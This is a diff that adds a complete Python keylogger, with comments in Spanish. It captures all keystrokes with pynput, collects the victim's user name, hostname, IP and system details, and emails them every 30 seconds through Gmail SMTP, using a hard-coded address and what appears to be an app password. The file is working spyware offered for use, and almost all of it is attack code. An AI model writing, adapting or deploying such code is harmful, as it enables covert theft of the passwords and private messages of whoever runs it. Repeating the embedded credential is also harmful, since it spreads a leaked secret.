@@ -1,0 +1,102 @@
+#!/usr/bin/env python3
+from pynput import keyboard
+import os
+import smtplib
+import platform
+import socket
+import getpass
+from datetime import datetime
+from threading import Timer
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+# Configuración del correo
+EMAIL_ADDRESS = "pruebakey011@gmail.com"
+EMAIL_PASSWORD = "shdj ornq ggzj emnl"
+EMAIL_DESTINO = "pruebakey011@gmail.com"
+
+# Variables globales
+log = ""
+INTERVALO_ENVIO = 30  # segundos
+
+def get_system_info():
+    info = {
+        "Usuario": getpass.getuser(),
+        "Hostname": socket.gethostname(),
+        "Dirección IP": socket.gethostbyname(socket.gethostname()),
+        "Sistema Operativo": platform.system(),
+        "Versión": platform.version(),
+        "Arquitectura": platform.machine(),
+        "Procesador": platform.processor(),
+    }
+    return "\n".join([f"{k}: {v}" for k, v in info.items()])
+
+# Función de respaldo local
+def guardar_en_archivo(mensaje):
+    with open("respaldo_keylog.txt", "a") as f:
+        f.write(f"\n[{datetime.now()}] - Fallo al enviar. Registro local:\n")
+        f.write(mensaje + "\n")
+
+# Función de envío
+def enviar_correo(mensaje):
+    try:
+        # Crear mensaje
+        msg = MIMEMultipart()
+        msg['From'] = EMAIL_ADDRESS
+        msg['To'] = EMAIL_DESTINO
+        msg['Subject'] = "possible key"  # Asunto del correo
+        
+        # Agregar el cuerpo del mensaje
+        msg.attach(MIMEText(mensaje, 'plain'))
+
+        # Conectar al servidor SMTP
+        servidor = smtplib.SMTP("smtp.gmail.com", 587)
+        servidor.starttls()
+        servidor.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+        servidor.sendmail(EMAIL_ADDRESS, EMAIL_DESTINO, msg.as_string())
+        servidor.quit()
+
+        print("[✓] Registro enviado exitosamente.")
+    except Exception as e:
+        print(f"[✗] Error al enviar correo: {e}")
+        guardar_en_archivo(mensaje)
+        print("[🧾] Registro guardado localmente en respaldo_keylog.txt.")
+
+# Captura de teclas
+def registrar_tecla(key):
+    global log
+    try:
+        log += key.char
+    except AttributeError:
+        if key == key.space:
+            log += " "
+        elif key == key.enter:
+            log += "\n"
+        else:
+            log += f" [{key}] "
+
+# 🔁 Envío cada INTERVALO_ENVIO segundos (actualizado)
+def enviar_periodicamente():
+    global log
+    if log:
+        print("[•] Enviando registro de teclas...")
+
+        # ✅ Agrega info del sistema al mensaje
+        mensaje = f"{get_system_info()}\n\nRegistro de teclas:\n\n{log}"
+        enviar_correo(mensaje)
+
+        log = ""
+    else:
+        print("[~] No hay teclas nuevas para enviar.")
+    Timer(INTERVALO_ENVIO, enviar_periodicamente).start()
+
+# Inicio
+print("[✔] Keylogger iniciado. Esperando entrada de teclado...")
+
+# Obtener la información del sistema y enviarla por correo
+informacion_sistema = get_system_info()
+enviar_correo(informacion_sistema)
+
+with keyboard.Listener(on_press=registrar_tecla) as listener:
+    enviar_periodicamente()
+    listener.join()
